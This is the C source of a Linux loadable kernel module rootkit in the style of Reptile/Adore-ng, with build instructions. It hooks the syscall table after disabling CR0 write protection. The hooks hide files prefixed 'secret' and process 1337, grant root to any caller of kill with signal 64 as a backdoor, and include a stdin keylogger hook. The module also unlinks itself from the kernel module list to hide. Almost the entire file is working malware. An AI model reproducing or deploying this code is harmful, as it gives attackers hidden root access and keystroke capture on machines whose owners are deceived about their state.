/*
 * Syscall Table Hook - Kernel syscall interception
 * Reptile/Adore-ng patterns
 *
 * Build: make -C /lib/modules/$(uname -r)/build M=$PWD modules
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

MODULE_LICENSE("GPL");

// ============================================================================
// SYSCALL TABLE
// ============================================================================

static unsigned long** sct = 0;

static asmlinkage long (*o_getdents64)(unsigned int, struct linux_dirent64*, unsigned int);
static asmlinkage long (*o_kill)(pid_t, int);
static asmlinkage long (*o_read)(unsigned int, char*, size_t);

// ============================================================================
// KALLSYMS
// ============================================================================

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#include <linux/kprobes.h>

typedef unsigned long (*kln_t)(const char*);

static struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

unsigned long* get_sct(void)
{
    kln_t kln;
    register_kprobe(&kp);
    kln = (kln_t)kp.addr;
    unregister_kprobe(&kp);
    return (unsigned long*)kln("sys_call_table");
}
#else
unsigned long* get_sct(void)
{
    return (unsigned long*)kallsyms_lookup_name("sys_call_table");
}
#endif

// ============================================================================
// WRITE PROTECT
// ============================================================================

static inline void wp_off(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 &= ~0x10000;
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

static inline void wp_on(void)
{
    unsigned long cr0;
    asm volatile("mov %%cr0, %0" : "=r"(cr0));
    cr0 |= 0x10000;
    asm volatile("mov %0, %%cr0" : : "r"(cr0));
}

// ============================================================================
// HOOKED GETDENTS64 - FILE HIDE
// ============================================================================

#define HIDE_PFX "secret"

static asmlinkage long h_getdents64(unsigned int fd, struct linux_dirent64* d, unsigned int cnt)
{
    long ret = o_getdents64(fd, d, cnt);
    if(ret <= 0) return ret;

    struct linux_dirent64* cur = d;
    unsigned long off = 0;

    while(off < ret) {
        int i = 0, match = 1;
        char* pfx = HIDE_PFX;
        while(pfx[i]) {
            if(cur->d_name[i] != pfx[i]) { match = 0; break; }
            i++;
        }

        if(match) {
            unsigned long reclen = cur->d_reclen;
            unsigned long rem = ret - off - reclen;
            if(rem > 0) memmove(cur, (char*)cur + reclen, rem);
            ret -= reclen;
        } else {
            off += cur->d_reclen;
            cur = (struct linux_dirent64*)((char*)cur + cur->d_reclen);
        }
    }

    return ret;
}

// ============================================================================
// HOOKED KILL - PROCESS HIDE + BACKDOOR
// ============================================================================

#define HIDE_PID 1337
#define MAGIC_SIG 64

static asmlinkage long h_kill(pid_t pid, int sig)
{
    if(pid == HIDE_PID) return -3;  // ESRCH

    if(sig == MAGIC_SIG) {
        struct cred* c = prepare_creds();
        if(c) {
            c->uid.val = 0;
            c->gid.val = 0;
            c->euid.val = 0;
            c->egid.val = 0;
            c->suid.val = 0;
            c->sgid.val = 0;
            c->fsuid.val = 0;
            c->fsgid.val = 0;
            commit_creds(c);
        }
        return 0;
    }

    return o_kill(pid, sig);
}

// ============================================================================
// HOOKED READ - KEYLOGGER
// ============================================================================

static char klog[4096];
static int kpos = 0;

static asmlinkage long h_read(unsigned int fd, char* buf, size_t cnt)
{
    long ret = o_read(fd, buf, cnt);

    if(ret > 0 && fd == 0 && kpos < sizeof(klog) - ret) {
        char kb[256];
        if(copy_from_user(kb, buf, ret < 256 ? ret : 255) == 0) {
            int i;
            for(i = 0; i < ret && kpos < sizeof(klog); i++)
                klog[kpos++] = kb[i];
        }
    }

    return ret;
}

// ============================================================================
// INSTALL HOOKS
// ============================================================================

static int install(void)
{
    sct = (unsigned long**)get_sct();
    if(!sct) return -1;

    o_getdents64 = (void*)sct[__NR_getdents64];
    o_kill = (void*)sct[__NR_kill];
    o_read = (void*)sct[__NR_read];

    wp_off();
    sct[__NR_getdents64] = (unsigned long*)h_getdents64;
    sct[__NR_kill] = (unsigned long*)h_kill;
    // sct[__NR_read] = (unsigned long*)h_read;
    wp_on();

    return 0;
}

// ============================================================================
// REMOVE HOOKS
// ============================================================================

static void uninstall(void)
{
    if(!sct) return;

    wp_off();
    sct[__NR_getdents64] = (unsigned long*)o_getdents64;
    sct[__NR_kill] = (unsigned long*)o_kill;
    sct[__NR_read] = (unsigned long*)o_read;
    wp_on();
}

// ============================================================================
// MODULE HIDE
// ============================================================================

static struct list_head* prev;

void hide(void)
{
    prev = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    kobject_del(&THIS_MODULE->mkobj.kobj);
}

// ============================================================================
// INIT/EXIT
// ============================================================================

static int __init rk_init(void)
{
    if(install() < 0) return -1;
    hide();
    return 0;
}

static void __exit rk_exit(void)
{
    uninstall();
}

module_init(rk_init);
module_exit(rk_exit);

// ============================================================================
// EOF
// ============================================================================
